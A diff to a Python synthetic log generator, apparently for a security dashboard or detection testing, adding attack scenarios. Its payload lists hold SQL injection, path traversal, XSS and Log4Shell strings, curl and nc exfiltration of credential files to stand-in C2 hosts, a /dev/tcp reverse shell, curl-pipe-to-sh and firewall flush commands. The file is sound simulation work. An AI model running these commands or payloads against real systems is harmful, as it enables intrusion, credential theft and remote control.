@@ -1,8 +1,51 @@
 from __future__ import annotations
 
 import random
-import string
 from datetime import datetime, timezone
+
+# ── category → UI colour (consumed by the web dashboard) ─────────────────────
+CATEGORY_COLORS: dict[str, str] = {
+    "auth":      "#ef4444",   # red
+    "privesc":   "#f59e0b",   # amber
+    "web":       "#8b5cf6",   # violet
+    "network":   "#06b6d4",   # cyan
+    "lateral":   "#ec4899",   # pink
+    "persist":   "#eab308",   # yellow
+    "exfil":     "#f97316",   # orange
+    "impact":    "#dc2626",   # deep red
+    "discovery": "#3b82f6",   # blue
+    "noise":     "#475569",   # slate
+}
+
+# ── per-scenario metadata (drives the UI scenario editor) ────────────────────
+SCENARIO_META: dict[str, dict] = {
+    "ssh_invalid_user":       {"label": "SSH Invalid User",         "category": "auth",      "severity": "medium"},
+    "ssh_failed_password":    {"label": "SSH Failed Password",      "category": "auth",      "severity": "medium"},
+    "ssh_accepted":           {"label": "SSH Login Accepted",       "category": "auth",      "severity": "info"},
+    "sudo_command":           {"label": "Sudo Command",             "category": "privesc",   "severity": "medium"},
+    "pam_su_failure":         {"label": "PAM su Failure",           "category": "privesc",   "severity": "medium"},
+    "new_user_created":       {"label": "New User Created",         "category": "persist",   "severity": "high"},
+    "cron_persistence":       {"label": "Cron Persistence",         "category": "persist",   "severity": "high"},
+    "cron_session":           {"label": "Cron Session",             "category": "noise",     "severity": "info"},
+    "kernel_usb_event":       {"label": "USB Device Event",         "category": "discovery", "severity": "low"},
+    "systemd_service_failure":{"label": "Systemd Service Failure",  "category": "noise",     "severity": "low"},
+    "apache_404":             {"label": "Apache 404",               "category": "web",       "severity": "low"},
+    "apache_500":             {"label": "Apache 500",               "category": "web",       "severity": "medium"},
+    "nginx_auth_failure":     {"label": "Nginx Auth Failure",       "category": "web",       "severity": "medium"},
+    "web_sql_injection":      {"label": "SQL Injection",            "category": "web",       "severity": "high"},
+    "web_lfi_attempt":        {"label": "LFI / Path Traversal",     "category": "web",       "severity": "high"},
+    "web_log4j_attempt":      {"label": "Log4Shell Probe",          "category": "web",       "severity": "critical"},
+    "web_xss_attempt":        {"label": "XSS Attempt",              "category": "web",       "severity": "medium"},
+    "suricata_alert":         {"label": "Suricata Alert",           "category": "network",   "severity": "high"},
+    "openvpn_tls_error":      {"label": "OpenVPN TLS Error",        "category": "network",   "severity": "medium"},
+    "port_scan_detected":     {"label": "Port Scan Detected",       "category": "discovery", "severity": "medium"},
+    "lateral_ssh_hop":        {"label": "Lateral SSH Hop",          "category": "lateral",   "severity": "high"},
+    "sensitive_file_access":  {"label": "Sensitive File Access",    "category": "exfil",     "severity": "high"},
+    "large_outbound_transfer":{"label": "Large Outbound Transfer",  "category": "exfil",     "severity": "high"},
+    "iptables_modified":      {"label": "Firewall Rule Changed",    "category": "impact",    "severity": "critical"},
+    "process_injection_attempt":{"label":"Process Injection",       "category": "impact",    "severity": "critical"},
+    "generic_syslog_noise":   {"label": "Background Noise",         "category": "noise",     "severity": "info"},
+}
 
 
 USERNAMES = [
@@ -131,6 +174,8 @@ def prefix(now: datetime, hostname: str, program: str) -> str:
     return f"{syslog_timestamp(now)} {hostname} {program}:"
 
 
+# ── existing scenarios ────────────────────────────────────────────────────────
+
 def ssh_invalid_user(endpoint: dict, rng: random.Random, now: datetime) -> str:
     return (
         f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
@@ -177,83 +222,303 @@ def kernel_usb_event(endpoint: dict, rng: random.Random, now: datetime) -> str:
 
 
 def cron_session(endpoint: dict, rng: random.Random, now: datetime) -> str:
-    cron_pid = rng.randint(1000, 20000)
     return (
-        f"{prefix(now, endpoint['name'], f'CRON[{cron_pid}]')} "
+        f"{prefix(now, endpoint['name'], f'CRON[{rng.randint(1000, 20000)}]')} "
         f"pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)"
     )
 
 
 def systemd_service_failure(endpoint: dict, rng: random.Random, now: datetime) -> str:
-    service = rng.choice(SERVICES)
     return (
-        f"{prefix(now, endpoint['name'], 'systemd[1]')} {service}.service: Main process exited, "
-        f"code=exited, status={rng.choice([1, 2, 203, 255])}/FAILURE"
+        f"{prefix(now, endpoint['name'], 'systemd[1]')} {rng.choice(SERVICES)}.service: "
+        f"Main process exited, code=exited, status={rng.choice([1, 2, 203, 255])}/FAILURE"
     )
 
 
 def apache_404(endpoint: dict, rng: random.Random, now: datetime) -> str:
     return (
         f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
-        f"{public_ip(rng)} - - [{apache_timestamp(now)}] \"GET {rng.choice(HTTP_PATHS)} HTTP/1.1\" "
-        f"404 {rng.randint(200, 2500)} \"-\" \"{rng.choice(USER_AGENTS)}\""
+        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
+        f'"GET {rng.choice(HTTP_PATHS)} HTTP/1.1" 404 {rng.randint(200, 2500)} '
+        f'"-" "{rng.choice(USER_AGENTS)}"'
     )
 
 
 def apache_500(endpoint: dict, rng: random.Random, now: datetime) -> str:
     return (
         f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
-        f"{public_ip(rng)} - - [{apache_timestamp(now)}] \"POST /api/v1/login HTTP/1.1\" "
-        f"500 {rng.randint(500, 3000)} \"https://portal.example.invalid/login\" \"{rng.choice(USER_AGENTS)}\""
+        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
+        f'"POST /api/v1/login HTTP/1.1" 500 {rng.randint(500, 3000)} '
+        f'"https://portal.example.invalid/login" "{rng.choice(USER_AGENTS)}"'
     )
 
 
 def nginx_auth_failure(endpoint: dict, rng: random.Random, now: datetime) -> str:
     return (
-        f"{prefix(now, endpoint['name'], f'nginx[{rng.randint(1000, 9000)}]')} *{rng.randint(10, 999)} "
-        f"user \"admin\": password mismatch, client: {public_ip(rng)}, server: "
-        f"portal.example.invalid, request: \"GET /admin HTTP/1.1\", host: \"portal.example.invalid\""
+        f"{prefix(now, endpoint['name'], f'nginx[{rng.randint(1000, 9000)}]')} "
+        f"*{rng.randint(10, 999)} user \"admin\": password mismatch, client: {public_ip(rng)}, "
+        f"server: portal.example.invalid, request: \"GET /admin HTTP/1.1\", "
+        f"host: \"portal.example.invalid\""
     )
 
 
 def suricata_alert(endpoint: dict, rng: random.Random, now: datetime) -> str:
-    destination_port = rng.choice([22, 80, 443, 8080, 8443])
+    dst_port = rng.choice([22, 80, 443, 8080, 8443])
     return (
         f"{prefix(now, endpoint['name'], f'suricata[{rng.randint(1000, 9000)}]')} "
-        f"[1:{rng.randint(2000000, 2099999)}:{rng.randint(1, 5)}] {rng.choice(SURICATA_SIGNATURES)} "
+        f"[1:{rng.randint(2000000, 2099999)}:{rng.randint(1, 5)}] "
+        f"{rng.choice(SURICATA_SIGNATURES)} "
         f"[Classification: Attempted Information Leak] [Priority: {rng.choice([1, 2, 3])}] "
-        f"{{TCP}} {public_ip(rng)}:{rng.randint(1024, 65535)} -> {private_ip(rng)}:{destination_port}"
+        f"{{TCP}} {public_ip(rng)}:{rng.randint(1024, 65535)} -> {private_ip(rng)}:{dst_port}"
     )
 
 
 def openvpn_tls_error(endpoint: dict, rng: random.Random, now: datetime) -> str:
     return (
-        f"{prefix(now, endpoint['name'], f'openvpn[{rng.randint(1000, 9000)}]')} TLS Error: incoming "
-        f"packet authentication failed from [AF_INET]{public_ip(rng)}:{rng.randint(1024, 65535)}"
+        f"{prefix(now, endpoint['name'], f'openvpn[{rng.randint(1000, 9000)}]')} "
+        f"TLS Error: incoming packet authentication failed from "
+        f"[AF_INET]{public_ip(rng)}:{rng.randint(1024, 65535)}"
     )
 
 
 def generic_syslog_noise(endpoint: dict, rng: random.Random, now: datetime) -> str:
-    message = rng.choice(SYSLOG_NOISE_MESSAGES)
-    if message.startswith(("systemd", "CRON", "NetworkManager", "dockerd", "systemd-timesyncd")):
-        return f"{syslog_timestamp(now)} {endpoint['name']} {message}"
-    return f"{prefix(now, endpoint['name'], 'syslogd')} {message}"
+    msg = rng.choice(SYSLOG_NOISE_MESSAGES)
+    if msg.startswith(("systemd", "CRON", "NetworkManager", "dockerd", "systemd-timesyncd")):
+        return f"{syslog_timestamp(now)} {endpoint['name']} {msg}"
+    return f"{prefix(now, endpoint['name'], 'syslogd')} {msg}"
 
+
+# ── new scenarios ─────────────────────────────────────────────────────────────
+
+SQL_PAYLOADS = [
+    "1' OR '1'='1",
+    "1; DROP TABLE users--",
+    "admin'--",
+    "1 UNION SELECT null,null,null--",
+    "' OR 1=1 LIMIT 1--",
+]
+
+LFI_PATHS = [
+    "../../../../etc/passwd",
+    "../../../../etc/shadow",
+    "../../windows/win.ini",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+]
+
+XSS_PAYLOADS = [
+    "<script>alert(document.cookie)</script>",
+    "<img src=x onerror=alert(1)>",
+    "javascript:alert(1)",
+    '"><svg/onload=alert(1)>',
+]
+
+LOG4J_PAYLOADS = [
+    "${jndi:ldap://attacker.example.invalid:1389/exploit}",
+    "${jndi:rmi://c2.example.invalid/pwn}",
+    "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example.invalid/a}",
+    "${jndi:dns://log4shell.example.invalid/test}",
+]
+
+SENSITIVE_FILES = [
+    "/etc/shadow",
+    "/root/.ssh/id_rsa",
+    "/var/lib/mysql/root.password",
+    "/etc/ssl/private/server.key",
+    "/root/.bash_history",
+    "/home/ubuntu/.aws/credentials",
+]
+
+EXFIL_COMMANDS = ["/bin/cp {f} /tmp/.{r}", "/usr/bin/curl -F file=@{f} http://c2.example.invalid/upload", "/usr/bin/base64 {f} | nc {ip} 4444"]
+
+IPTABLES_CMDS = [
+    "/sbin/iptables -F",
+    "/sbin/iptables -P INPUT ACCEPT",
+    "/sbin/iptables -A INPUT -s 0.0.0.0/0 -j ACCEPT",
+    "/sbin/ufw disable",
+    "/sbin/iptables -D INPUT 1",
+]
+
+CRON_TAILS = [
+    "/tmp/.update",
+    "bash -i >& /dev/tcp/{ip}/4444 0>&1",
+    "curl -s http://c2.example.invalid/implant | sh",
+    "/usr/bin/python3 /tmp/.socket.py",
+]
+
+NEW_USERNAMES = ["contractor", "service-acct", "tmpuser", "devops99", "ansible-runner", "gitlab-ci"]
+
+
+def ssh_accepted(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    method = rng.choice(["publickey", "password"])
+    fp = f"SHA256:{random_hex(rng, 43)}" if method == "publickey" else ""
+    suffix = f": RSA {fp}" if fp else ""
+    return (
+        f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
+        f"Accepted {method} for {rng.choice(USERNAMES)} from {public_ip(rng)} "
+        f"port {rng.randint(1024, 65535)} ssh2{suffix}"
+    )
+
+
+def lateral_ssh_hop(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    """SSH accepted from an internal IP — lateral movement indicator."""
+    method = rng.choice(["publickey", "password"])
+    user = rng.choice(["root", *USERNAMES])
+    return (
+        f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
+        f"Accepted {method} for {user} from {private_ip(rng)} "
+        f"port {rng.randint(1024, 65535)} ssh2"
+    )
+
+
+def new_user_created(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    actor = rng.choice(USERNAMES)
+    new_user = rng.choice(NEW_USERNAMES)
+    return (
+        f"{prefix(now, endpoint['name'], 'sudo')} {actor} : "
+        f"TTY=pts/{rng.randint(0, 8)} ; PWD=/home/{actor} ; USER=root ; "
+        f"COMMAND=/usr/sbin/useradd -m -s /bin/bash {new_user}"
+    )
+
+
+def cron_persistence(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    actor = rng.choice([*USERNAMES, "root"])
+    tail = rng.choice(CRON_TAILS).format(ip=public_ip(rng))
+    schedule = f"{rng.randint(0,59)} {rng.randint(0,23)} * * *"
+    return (
+        f"{prefix(now, endpoint['name'], f'crontab[{rng.randint(1000, 9000)}]')} "
+        f"({actor}) REPLACE ({actor}): {schedule} {tail}"
+    )
+
+
+def web_sql_injection(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    payload = rng.choice(SQL_PAYLOADS).replace(" ", "%20").replace("'", "%27")
+    path = rng.choice(["/login.php", "/api/user", "/search", "/products"])
+    param = rng.choice(["id", "user", "q", "page"])
+    return (
+        f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
+        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
+        f'"GET {path}?{param}={payload} HTTP/1.1" {rng.choice([200, 500, 403])} '
+        f'{rng.randint(200, 8000)} "-" "{rng.choice(USER_AGENTS)}"'
+    )
+
+
+def web_lfi_attempt(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    payload = rng.choice(LFI_PATHS)
+    param = rng.choice(["page", "file", "path", "include"])
+    return (
+        f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
+        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
+        f'"GET /index.php?{param}={payload} HTTP/1.1" {rng.choice([200, 403, 500])} '
+        f'{rng.randint(200, 4000)} "-" "{rng.choice(USER_AGENTS)}"'
+    )
+
+
+def web_log4j_attempt(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    payload = rng.choice(LOG4J_PAYLOADS)
+    return (
+        f"{prefix(now, endpoint['name'], f'nginx[{rng.randint(1000, 9000)}]')} "
+        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
+        f'"GET / HTTP/1.1" {rng.choice([200, 400, 403])} {rng.randint(100, 3000)} '
+        f'"-" "{payload}"'
+    )
+
+
+def web_xss_attempt(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    payload = rng.choice(XSS_PAYLOADS).replace("<", "%3C").replace(">", "%3E")
+    path = rng.choice(["/search", "/comment", "/feedback", "/api/input"])
+    return (
+        f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
+        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
+        f'"GET {path}?q={payload} HTTP/1.1" 200 {rng.randint(500, 4000)} '
+        f'"-" "{rng.choice(USER_AGENTS)}"'
+    )
+
+
+def port_scan_detected(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    scanner = public_ip(rng)
+    port = rng.randint(1, 65535)
+    return (
+        f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
+        f"Connection closed by invalid user {rng.choice(INVALID_USERS)} "
+        f"{scanner} port {port} [preauth]"
+    )
+
+
+def sensitive_file_access(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    actor = rng.choice(USERNAMES)
+    target = rng.choice(SENSITIVE_FILES)
+    cmd_tpl = rng.choice(EXFIL_COMMANDS)
+    cmd = cmd_tpl.format(f=target, r=random_hex(rng, 6), ip=public_ip(rng))
+    return (
+        f"{prefix(now, endpoint['name'], 'sudo')} {actor} : "
+        f"TTY=pts/{rng.randint(0, 8)} ; PWD=/home/{actor} ; USER=root ; "
+        f"COMMAND={cmd}"
+    )
+
+
+def large_outbound_transfer(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    size_mb = rng.randint(256, 4096)
+    dest = public_ip(rng)
+    port = rng.choice([443, 80, 21, 22, 8443])
+    speed = f"{rng.randint(1, 50)}.{rng.randint(0, 9)}"
+    return (
+        f"{prefix(now, endpoint['name'], f'curl[{rng.randint(1000, 9000)}]')} "
+        f"Transfer complete to {dest}:{port} — {size_mb} MB in "
+        f"{rng.randint(30, 600)}s ({speed} MB/s)"
+    )
+
+
+def iptables_modified(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    actor = rng.choice([*USERNAMES, "root"])
+    return (
+        f"{prefix(now, endpoint['name'], 'sudo')} {actor} : "
+        f"TTY=pts/{rng.randint(0, 3)} ; PWD=/root ; USER=root ; "
+        f"COMMAND={rng.choice(IPTABLES_CMDS)}"
+    )
+
+
+def process_injection_attempt(endpoint: dict, rng: random.Random, now: datetime) -> str:
+    attacker_pid = rng.randint(1000, 30000)
+    victim_pid = rng.randint(1000, 30000)
+    victim = rng.choice(["sshd", "nginx", "postgres", "dockerd", "bash"])
+    return (
+        f"{prefix(now, endpoint['name'], 'kernel')} "
+        f"[{rng.randint(5000, 90000)}.{rng.randint(100000, 999999)}] "
+        f"ptrace request from pid {attacker_pid} to {victim}[{victim_pid}] "
+        f"via /proc/{victim_pid}/mem"
+    )
+
+
+# ── registry ──────────────────────────────────────────────────────────────────
 
 SCENARIOS = {
-    "apache_404": apache_404,
-    "apache_500": apache_500,
-    "cron_session": cron_session,
-    "generic_syslog_noise": generic_syslog_noise,
-    "kernel_usb_event": kernel_usb_event,
-    "nginx_auth_failure": nginx_auth_failure,
-    "openvpn_tls_error": openvpn_tls_error,
-    "pam_su_failure": pam_su_failure,
-    "ssh_failed_password": ssh_failed_password,
-    "ssh_invalid_user": ssh_invalid_user,
-    "sudo_command": sudo_command,
-    "suricata_alert": suricata_alert,
-    "systemd_service_failure": systemd_service_failure,
+    "apache_404":               apache_404,
+    "apache_500":               apache_500,
+    "cron_persistence":         cron_persistence,
+    "cron_session":             cron_session,
+    "generic_syslog_noise":     generic_syslog_noise,
+    "iptables_modified":        iptables_modified,
+    "kernel_usb_event":         kernel_usb_event,
+    "large_outbound_transfer":  large_outbound_transfer,
+    "lateral_ssh_hop":          lateral_ssh_hop,
+    "new_user_created":         new_user_created,
+    "nginx_auth_failure":       nginx_auth_failure,
+    "openvpn_tls_error":        openvpn_tls_error,
+    "pam_su_failure":           pam_su_failure,
+    "port_scan_detected":       port_scan_detected,
+    "process_injection_attempt":process_injection_attempt,
+    "sensitive_file_access":    sensitive_file_access,
+    "ssh_accepted":             ssh_accepted,
+    "ssh_failed_password":      ssh_failed_password,
+    "ssh_invalid_user":         ssh_invalid_user,
+    "sudo_command":             sudo_command,
+    "suricata_alert":           suricata_alert,
+    "systemd_service_failure":  systemd_service_failure,
+    "web_log4j_attempt":        web_log4j_attempt,
+    "web_lfi_attempt":          web_lfi_attempt,
+    "web_sql_injection":        web_sql_injection,
+    "web_xss_attempt":          web_xss_attempt,
 }
 
 SUPPORTED_SCENARIO_NAMES = tuple(sorted(SCENARIOS))
